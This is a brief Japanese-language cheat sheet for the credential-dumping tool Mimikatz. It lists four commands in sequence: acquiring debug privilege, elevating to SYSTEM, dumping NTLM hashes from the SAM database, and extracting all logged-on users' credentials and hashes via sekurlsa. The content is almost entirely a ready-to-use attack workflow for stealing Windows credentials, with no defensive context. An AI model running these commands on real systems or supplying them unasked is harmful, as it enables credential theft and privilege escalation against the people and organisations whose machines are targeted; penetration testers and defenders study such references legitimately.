# Mimikatz
[Documentation]()

## コマンド集

1. Mimikatzのプロセスにデバッグ権限を要求して、認証情報の抽出を可能にする。SeDebugPrivlege権限を取得する。
```
privilege::debug
```

2. SYSTEM権限に昇格する
```
token::elevate
```

3. SAMデータベースからユーザのNTLMハッシュをダンプする
```
lsadump::sam
```

4. Sekurlsaモジュールを使ってログオンしているすべてのユーザの資格情報、ハッシュをダンプする
```
sekurlsa::logonpasswords
```